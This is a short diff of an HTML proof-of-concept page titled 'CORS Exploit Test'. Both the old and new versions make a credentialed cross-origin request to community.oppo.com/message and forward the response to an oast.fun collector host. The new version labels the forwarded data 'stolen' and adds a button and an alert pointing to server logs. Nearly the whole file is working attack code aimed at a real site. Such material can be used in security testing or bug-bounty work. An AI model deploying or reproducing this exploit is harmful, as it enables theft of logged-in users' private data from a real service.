@@ -1,20 +1,39 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit Test</title>
+</head>
 <body>
-<script>
-fetch("https://community.oppo.com/message", {
-  method: "GET",
-  credentials: "include"
-})
-.then(response => response.text())
-.then(data => {
-  fetch("https://wvmpoqwmojgtvoyeknicw8buzdcmqb4da.oast.fun", {
-    method: "POST",
-    mode: "no-cors",
-    body: btoa(data)
-  });
-})
-.catch(error => console.error('Fetch error:', error));
-</script>
+  <h1>Attempting CORS request to victim</h1>
+  <button onclick="sendRequest()">Send CORS Request</button>
+
+  <script>
+    function sendRequest() {
+      fetch('https://community.oppo.com/message', {
+        method: 'GET',
+        credentials: 'include', // send cookies if the site uses session-based auth
+        mode: 'cors'
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Response from victim.com:', data);
+
+        // Optionally exfiltrate data to your server
+        fetch('https://wvmpoqwmojgtvoyeknicw8buzdcmqb4da.oast.fun', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ stolen: data })
+        });
+
+        alert('Request sent. Check your server logs!');
+      })
+      .catch(error => {
+        console.error('CORS Request failed:', error);
+      });
+    }
+  </script>
 </body>
 </html>
